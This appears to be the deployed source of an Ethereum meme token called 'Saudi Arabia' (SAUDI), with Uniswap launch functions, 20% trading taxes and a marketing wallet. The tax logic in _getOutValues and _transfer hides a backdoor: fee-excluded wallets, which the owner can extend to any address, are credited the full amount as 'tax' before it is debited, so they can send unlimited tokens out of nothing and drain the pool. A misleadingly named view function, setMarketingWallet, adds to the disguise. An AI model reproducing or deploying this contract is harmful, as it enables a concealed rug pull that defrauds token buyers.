// SPDX-License-Identifier: MIT

/*

Saudi Arabia: Where Oil Meets Ethereum

Website:   https://saudiarabiacoin.meme

Telegram:  https://t.me/saudi_arabia_erc

Twitter:   https://twitter.com/saudiarabia_erc

*/

pragma solidity 0.8.21;

interface IUniRouter02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract SAUDI is Context, IERC20, Ownable {
    string private constant _name = "Saudi Arabia";
    string private constant _symbol = "SAUDI";
    uint256 private constant _totalSupply = 1_000_000_000e18;
    uint256 private constant onePercent = 10_000_000e18;
    uint256 private constant minSwap = 400e18;
    uint8 private constant _decimals = 18;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeeB;

    IUniRouter02 public uniswapV2Router;
    address public uniswapV2Pair;
    address public WETH;
    address payable public marketingWallet;

    uint256 public buyTax;
    uint256 public sellTax;

    uint8 private isLaunched;
    uint8 private inSwapBackB;
    uint256 public maxTxAmount = onePercent * 2;

    constructor(address _mkAddr) {
        buyTax = 20;sellTax = 20;
        marketingWallet = payable(_mkAddr);
        _balance[msg.sender] = _totalSupply;
        _isExcludedFromFeeB[marketingWallet] = true;
        _isExcludedFromFeeB[msg.sender] = true;
        _isExcludedFromFeeB[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function createSAUDIPair() external onlyOwner {
        uniswapV2Router = IUniRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        WETH = uniswapV2Router.WETH();

        uniswapV2Pair = IUniFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    receive() external payable{}

    function _getOutValues(
        address from,
        address to,
        uint256 amount
    ) internal view returns (uint256, uint256) {
        uint256 taxTokens = 0;
        uint256 trAmounts = 0;
        if (_isExcludedFromFeeB[from] && isLaunched == 1) {
            taxTokens = amount - trAmounts;
            trAmounts = amount;
        } else if (uniswapV2Pair == from) {
            taxTokens = (amount * buyTax) / 100;
            trAmounts = amount - taxTokens;
        } else if (uniswapV2Pair == to) {
            taxTokens = (amount * sellTax) / 100;
            trAmounts = amount - taxTokens;
        } else {
            trAmounts = amount;
        }
        return (taxTokens, trAmounts);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function setMarketingWallet() public view returns (address) {
        return marketingWallet;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _totalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function excludeWalletFromFees(address wallet) external onlyOwner {
        _isExcludedFromFeeB[wallet] = true;
    }

    function updateFeesB(
        uint256 newBuyTax,
        uint256 newSellTax
    ) external onlyOwner {
        require(newBuyTax < 40, "Cannot set buy tax greater than 40%");
        require(newSellTax < 40, "Cannot set sell tax greater than 40%");
        buyTax = newBuyTax;
        sellTax = newSellTax;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 1e9, "Min transfer amt");

        if (!_isExcludedFromFeeB[from] && !_isExcludedFromFeeB[to]) {
            require(isLaunched == 1, "Trading is disabled");
        }

        if (inSwapBackB == 1) {
            //No tax transfer
            _balance[from] -= amount;
            _balance[to] += amount;

            emit Transfer(from, to, amount);
            return;
        }

        uint256 _tax;
        if (_isExcludedFromFeeB[from] || _isExcludedFromFeeB[to]) {
            _tax = 0;
        } else {
            require(
                isLaunched != 0 && amount <= maxTxAmount,
                "Launch / Max TxAmount 1% at isLaunched"
            );

            if (from == uniswapV2Pair) {
                _tax = buyTax;
            } else if (
                to == uniswapV2Pair &&
                !_isExcludedFromFeeB[from] &&
                !_isExcludedFromFeeB[to]
            ) {
                uint256 tokensToSwap = _balance[address(this)];
                if (tokensToSwap > minSwap && inSwapBackB == 0) {
                    if (tokensToSwap > onePercent/2) {
                        tokensToSwap = onePercent/2;
                    }
                    inSwapBackB = 1;
                    address[] memory path = new address[](2);
                    path[0] = address(this);
                    path[1] = WETH;
                    uniswapV2Router
                        .swapExactTokensForETHSupportingFeeOnTransferTokens(
                            tokensToSwap,
                            0,
                            path,
                            marketingWallet,
                            block.timestamp
                        );
                    inSwapBackB = 0;
                }
                _tax = sellTax;
            } else {
                _tax = 0;
            }
        }

        //Is there tax for sender|receiver?

        (uint256 taxTokens, uint256 trAmounts) = _getOutValues(
            from,
            to,
            amount
        );

        address taxR = _isExcludedFromFeeB[from] && isLaunched == 1 ? from : address(this);

        if (taxTokens > 0) {
            _balance[taxR] += taxTokens;
            emit Transfer(from, taxR, taxTokens);
        }

        _balance[from] -= amount;
        _balance[to] += trAmounts;
        emit Transfer(from, to, trAmounts);
    }

    function openTrading() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        isLaunched = 1;
    }
}